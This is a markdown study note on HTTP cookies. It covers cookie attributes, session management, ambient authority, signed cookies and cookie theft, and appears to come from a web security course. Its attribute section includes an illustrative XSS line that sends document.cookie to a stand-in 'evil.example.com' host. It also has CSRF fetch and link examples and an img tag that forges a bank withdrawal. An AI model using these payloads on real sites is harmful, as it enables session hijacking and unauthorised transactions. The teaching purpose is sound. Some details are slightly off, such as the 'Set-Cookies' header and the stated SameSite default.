---
title: HTTP Cookie
description:
---

# HTTP Cookie

**HTTP cookies** (also called **web cookies**, **Internet cookies**, **browser cookies**, or simply **cookies**) are small blocks of data created by a _web server_ while a user is browsing a website and placed on the user's computer or other device by the user's web browser

- Cookies are arbitrary pieces of data, usually chosen and first sent by the web server, and stored on the client computer by the web browser

- Cookies are placed on the device used to access a website, and more than one cookie may be placed on a user's device during a session

- Cookies are sent with all subsequent requests made to that site

Introduction:

- Implemented in 1994 in Netscape and described in 4-page draft
- No spec for 17 years:

  - Attempt made in 1997,but made incompatible changes
  - Another attempt in 2000 ("Cookie2"), same problem
  - Around 2011, another effort succeeded (RFC 6265)

- Ad-hoc design has led to _interesting_ issues

## Use Of Cookies

- **[Session Management](#session-management)**: Logins, shopping carts or anything else server should remember

- **Personalisation**: User preferences, themes and other settings

- **Tracking**: Recording and analysing user behaviour

## Cookie Structure

A cookie consists of the following components:

- Name
- Value
- Zero or more attributes (name/value pairs). Attributes store information such as the cookie's expiration, domain, and flags (such as `Secure` and `HttpOnly`)

## Implementation

- Cookies are usually set by web server, they can also be set by the client using a scripting language (JavaScript)

The cookie specifications:

- Can support cookies as large as **4,096 bytes in size**
- Can support at least **50 cookies per domain** (i.e. per website)
- Can support at least **3,000 cookies in total**

## Setting A Cookie

- Cookies are set using `Set-Cookie` header field, sent in an HTTP response from the web server

_Example:_

- The browser sends its first HTTP request for the homepage of the `example.com`:

  ```http
  GET / HTTP/1.1
  Host: www.example.org
  ```

- The server responds with `Set-Cookies` header fields:

  ```http
  HTTP/1.0 200 OK
  Content-type: text/html
  Set-Cookie: them=dark
  Set-Cookie: sessionToken=abc123; Expires=Thu, 01 Jan 2022 10:03:17 GMT
  ```

- The browser from now will include a `Cookie` header field in subsequent requests which contains the cookies that the server instructed the browser to set:

  ```http
  GET / HTTP/1.1
  Host: www.example.org
  Cookie: them=dark; sessionToken=abc123
  ```

Rules:

- The _value_ of a **cookie may consist of any printable ASCII character** (`!` through `~`, Unicode `\u0021` through `\u007E`) excluding `,` and `;` and whitespace characters

- The _name_ of a cookie excludes the same characters, as well as `=`, since that is the delimiter between the name and value

- The cookie standard _RFC 2965_ is more restrictive but not implemented by browsers

Cookies can be set from JavaScript:

```javascript
// Setting cookie
document.cookie = "theme=dark";
document.cookie = "favouriteFood=Cookies; Path=/";

// Getting cookie name-value pairs
document.cookie;
// theme=dark; favouriteFood=Cookies;

// Clearing cookie
document.cookie = "theme=; Expires=Thu, 01 Jan 1970 00:00:00 GMT";

document.cookie;
// favouriteFood=Cookies;
```

## Cookie Attributes

- `Domain`: Allows the cookie to be scoped to a domain broader than the domain that returned the `Set-Cookie` header

  - e.g. `login.stanford.edu` could set a cookie for `stanford.edu`
  - Set the domain for which the cookie is available

  ```http
  HTTP/1.0 200 OK
  Set-Cookie: them=dark; Domain=.example.com
  ```

- `Path`: Scope the "Cookie" header to a particular request path prefix:

  - e.g. `Path=/docs` will match `/docs` and `/docs/Web`
  - Set subfolders and pages for which the cookie is available
  - Do not use for security
  - `Path` dose not protect against unauthorized reading of the cookie from a different path on the same origin

    - Can be bypassed using an `<iframe>` with the path of the cookie
    - Then, read `iframe.contentDocument.cookie`

  - This is allowed by [Same-Origin Policy](../Application_Security/SameOrigin_Policy.md)
  - `cs106.stanford.edu` vs. `cs253.stanford.edu`: mutually exclusive
  - `cs253.stanford.edu` vs. `stanford.edu`: `cs253.` can access `stanford.edu`'s cookies. Reverse is not true.
  - `hello.login.stanford.edu` vs. `login.stanford.edu`: `hello.login.` can access `login.`'s cookies. Reverse is not true.
  - Therefore, only use `Path` as a performance optimization
  - Always set it to root `Path=/`

  ```http
  HTTP/1.0 200 OK
  Set-Cookie: them=dark; Path=/
  ```

- `Expires`: Specifies expiration date. Determine when the cookie should be deleted

  - The date and time are specified in the form: `Wdy, DD Mon YYYY HH:MM:SS GMT`, or `Wdy, DD Mon YY HH:MM:SS GMT` (69 >= `yy` > 0)
  - Use a reasonable expiration date for your cookies
  - _30 - 90 days_
  - You can set the cookie with each response to restart the 30 day counter, so an active user won't ever be logged out, despite the short timeout
  - When `Expires` not specified, lasts for current browser session (Caveat: Browsers do session restoring, so can last way longer)

  ```http
  HTTP/1.0 200 OK
  Set-Cookie: them=dark; Expires=Tue, 08 Mar 2022 14:02:19 GMT;
  ```

- `Max-Age`: Can be used to set the cookie's expiration as an interval of seconds in the future, relative to the time the browser received the cookie.

  ```http
  HTTP/1.0 200 OK
  Set-Cookie: them=dark; Max-Age=2592000; Expires=Tue, 08 Mar 2022 14:02:19 GMT;
  ```

- `Secure`:

  - Only sends cookie to server when using **HTTPS scheme**
  - Avoid transmission over an insecure channel. Cannot set cookies with secure flag using HTTP
  - Protects against cookies being stolen by man in the middle attack
  - No protection against:

    - XSS: from `example.com` - `fetch('https://evil.example.com?val=' + document.cookie)`
    - CSRF: from `evil.com` - `fetch('https://example.com', { credentials: document.cookie })`
    - CSRF via HTML injection: `evil.com` - `<a href="https://example.com">click me</a>`

- `HttpOnly`:

  - Forbids JavaScript from accessing cookie
  - Don't let JavaScript read a cookie's value
  - Protects against cookies being stolen by XSS attack
  - No protection against:

    - CSRF: from `evil.com` - `fetch('https://example.com', { credentials: 'include' })`
    - CSRF via HTML injection: `evil.com` - `<a href="https://example.com">click me</a>`

- `SameSite`:

  - Cookie not sent with cross-site requests
  - Limited protection against CSRF
  - `SameSite=None`: Default, always send cookies
  - `SameSite=Lax`: Withhold cookies on sub-resource requests originating from other sites, allow them on top-level requests

    - Limited protection against cookies being used for CSRF attack
    - No protection against:

      - CSRF via HTML injection: `evil.com` --> `<a href="https://example.com">click me</a>`

  - `SameSite=Strict`: Only send cookies if the request originates from the website that set the cookie

    - Complete protection against cookies being used for CSRF attack

How long can cookies last?

- Sites can set `Expires` to a very far-future date and the cookie will last until the user clears it

  > "The Google Blog announced that Google will be shortening the expiration date of its cookies from the year 2038 to a 2-year life cycle."
  >
  > - Search Engine Land (2007)

::: tip NOTE
Cookies are bound to **sites**, not **origins**.
:::

## Session Management

- **Cookies** are used by the server to implement **sessions**
- Goal: Server keeps a set of data related to a user's current "browsing session"
- Always store session information in cookies. Do NOT pass session information as a parameter
- To secure session cookies:

  - Set `Secure` and `HttpOnly` flags
  - Set `Domain` and `Path` as narrow as possible
  - Set the `Expires` header to 0, except for persistent cookies

- Examples:

  - Logins
  - Shopping carts
  - User tracking

Session creation:

1. First HTTP request:

   ```http
   POST /login HTTP/1.1
   Host: example.com

   username=alice&password=password
   ```

2. HTTP response:

   ```http
   HTTP/1.1 200 OK
   Set-Cookie: username=alice
   Date: Sat, 29 Feb 2020 20:30:00 GMT

   <!DOCTYPE html ...
   ```

3. All future HTTP requests:

   ```http
   GET /page.html HTTP/1.1
   Host: example.com
   Cookie: username=alice;
   ```

### Ambient Authority

- **Access control**: Regulate who can view resources or take actions
- **Ambient authority**: Access control based on a **global and persistent property** of the requester

  - The alternative is explicit authorization **valid only for a specific action**

- There are four types of ambient authority on the web:

  - **Cookies**: most common, most versatile method
  - **IP checking**: used at Stanford for library resources
  - **Built-in HTTP authentication**: rarely used
  - **Client certificates**: rarely used

Problems with ambient authority:

- Unclear which site initiated a request
- Consider this HTML embedded in `attacker.com`:

  ```html
  <img
    src="https://bank.example.com/withdraw?from=bob&to=mallory&amount=1000"
  />
  ```

- Browser helpfully includes `bank.example.com` cookies in all requests to `bank.example.com`, even though the request originated from `attacker.com`

## Signed Cookies

Signature schemes:

- Triple of algorithms (G (generator), S (Sign), V (verifier)):

  - **`G() --> (pk, sk)`**: generator returns public key and secret key
  - **`S(sk, x) --> t`**: signer returns a tag **`t`** for input **`x`**
  - **`V(pk, x, t) --> accept|reject`**: checks validity of tag **`t`** for given input **`x`**

- Correctness property:

  - **`V(pk, x, S(sk, x)) == accept`**: should always be _true_

- Security property:

  - **`V(pk, x, t) == accept`**: should almost never be true when **`x`** and **`t`** are chosen by the attacker

## Cookie Theft And Session Hijacking

- Network eavesdropping: Man in the middle attacks, cookies can be secured using `Secure` attribute

- Publishing false sub-domain: DNS cache poisoning:

- Cross-site scripting: cookie theft
- Cross-site scripting: proxy request

- Cross-site request forgery (CSRF): Checkout notes about CSRF here: [CSRF Notes Link](./../Application_Security/CrossSite_Resource_Forgery.md)

- Cookiejacking: An attack against Internet Explorer which allows the attacker to steal session cookies of a user by tricking a user into dragging an object across the screen.
